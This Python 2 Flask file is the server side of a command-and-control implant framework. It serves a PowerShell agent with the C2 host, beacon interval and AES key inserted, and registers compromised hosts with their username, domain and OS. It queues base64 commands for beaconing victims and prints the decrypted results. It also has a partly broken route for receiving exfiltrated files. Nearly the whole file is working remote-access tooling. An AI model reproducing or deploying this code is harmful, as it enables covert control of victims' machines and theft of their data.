#!/usr/bin/python


import threading
import time
import base64
import sys
import os
import signal
import string
import random
from termcolor import colored
from functions import *
from encryption import *
from flask import *
import logging

# disable logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

class NewListener:

  def __init__(self,*args):
    print args
    arguments = len(args)
    self.arguments = arguments
    if len(args) == 6:
        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]
    elif len(args) == 8:

        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]
        self.cert = args[7]
        self.key = args[6]


  def start_listener(self):
    print self.arguments
    host = [self.bindip, self.bindport]

    if self.arguments == 6:
        self.ssl = False
        thread = threading.Thread(target=app.run, args=(host))
        thread.daemon = True
        thread.start()
    if self.arguments == 8:
    # certficates path (worked !)
        self.ssl = True
        print colored("SSL listener started !", "yellow")
        # self.cert ==> fullchain.pem
        # self.key  ==> key.pem
        # which is generated from letsencrypt certbot !

        cert = {"ssl_context": (self.cert, self.key)}
        thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
        thread.daemon = True
        thread.start()
    listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl, aes_encryption_key]

  def powershell_code(self):
      #return self.host
#    if request.headers["User-Agent"] != "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36":
#        return "Hello World !"
#    else:
        print self.host
        f = open("agents/agent.ps1")
        if self.ssl == True:
            proto = "https"
        elif self.ssl == False:
            proto = "http"

        pcode = f.read()
        return pcode.replace("SRVHOST", self.host).replace("OCU_INTERVAL", str(self.interval)).replace("OCU_PROTO", proto).replace("OCT_KEY", aes_encryption_key)




  def create_path(self):
      app.add_url_rule("/%s" % self.path, self.host , self.powershell_code)


@app.route("/file_receiver", methods=["POST"])
def fr():
    #filename = request.headers['filename']
    #f = open(filename, "wb")
    print request.form[0]
    #encoded_data = request.form["data"].encode("UTF-16LE")
    #data = base64.b64decode(encoded_data)
    #f.write(data)
    f.close()
    print colored("\n[+] File %s downloaded from the client !" % filename, "green")
    return "True"

@app.route("/command/<hostname>")
def command(hostname):
    for key in connections_information.keys():
        if hostname in connections_information[key]:
            required_key = key
            connections_information[required_key][6] = time.ctime()
    try:
            command_to_execute = commands[hostname]
            commands[hostname] = base64.b64encode("False")
    except KeyError:
            print colored("[-] Receiving unknown pings", "red")
            return "False"
    return command_to_execute

@app.route("/command_receiver")
def cr():
        #if request.method == "POST":
        encrypted_response = request.headers["Authorization"]
        print "\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n"
        return "a7a"

        #else:
        #    return "A"


@app.route("/first_ping")
def first_ping():
    	    global counter
            header = request.headers["Authorization"]
            raw_request = decrypt_command(aes_encryption_key, header).strip("\x00").split(",")
            hostname = raw_request[0]
            if hostname in commands.keys():
               return "HostName exist"

            username = raw_request[1]
            os_version = raw_request[2]
            pid = raw_request[3]
            domain = raw_request[4]
            ip = request.environ['REMOTE_ADDR']
            last_ping = time.ctime()
            connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
            print "\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter)
            commands[hostname] = base64.b64encode("False")
            counter = counter + 1
            return "GoodToGo"
    #except:
    #    return "HaHa !"
    #return "Hello World!"
